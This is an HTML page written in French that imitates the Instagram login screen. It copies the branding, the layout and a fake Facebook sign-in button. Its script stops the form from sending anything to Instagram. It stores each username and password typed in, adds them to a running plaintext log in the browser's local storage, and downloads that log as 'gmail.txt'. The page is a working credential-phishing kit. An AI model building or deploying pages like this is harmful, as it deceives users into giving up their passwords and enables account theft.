<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            display: flex;
            justify-content: space-around;
            width: 80%;
            max-width: 900px;
        }
        .phone-preview {
            position: relative;
        }
        .phone-preview img {
            width: 300px;
        }
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 350px;
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .login-box button {
            background-color: #3897f0;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            cursor: pointer;
            border-radius: 5px;
        }
        .login-box button:hover {
            background-color: #287dc2;
        }
        .login-box .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 10px 0;
        }
        .login-box .divider::before,
        .login-box .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .login-box .divider::before {
            margin-right: .25em;
        }
        .login-box .divider::after {
            margin-left: .25em;
        }
        .app-links img {
            width: 130px;
            margin: 10px 5px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Aperçu téléphone -->
        <div class="phone-preview">
            <img src="https://i.imgur.com/OGwIY3T.png" alt="Phone Preview">
        </div>

        <!-- Boîte de connexion -->
        <div class="login-box">
            <h1>Instagram</h1>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Num. téléphone, nom d’utilisateur ou e-mail" required>
                <input type="password" id="password" placeholder="Mot de passe" required>
                <button type="submit">Se connecter</button>
                <div class="divider">OU</div>
                <button type="button" style="background-color:#4267B2; color:white;">Se connecter avec Facebook</button>
                <p><a href="#">Mot de passe oublié ?</a></p>
            </form>
            <p>Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a></p>

            <div class="app-links">
                <p>Téléchargez l’application.</p>
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_FR.svg" alt="Google Play">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Badge_Store_windows_fr.png" alt="Microsoft Store">
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();  // Empêcher l'envoi du formulaire

            // Récupérer les données du formulaire
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Créer un contenu pour le fichier texte en ajoutant les nouvelles informations
            const oldContent = localStorage.getItem('formContent') || '';  // Charger ancien contenu s'il existe
            const newContent = oldContent + `Nom d'utilisateur : ${username}\nMot de passe : ${password}\n\n`;

            // Stocker le contenu dans localStorage pour permettre l'accumulation des données
            localStorage.setItem('formContent', newContent);

            // Créer un objet Blob avec le contenu du fichier (incluant les anciennes données)
            const blob = new Blob([newContent], { type: 'text/plain' });

            // Créer un lien de téléchargement
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'gmail.txt';  // Nom du fichier à télécharger
            link.click();  // Simuler un clic pour lancer le téléchargement
        });
    </script>

</body>
</html>
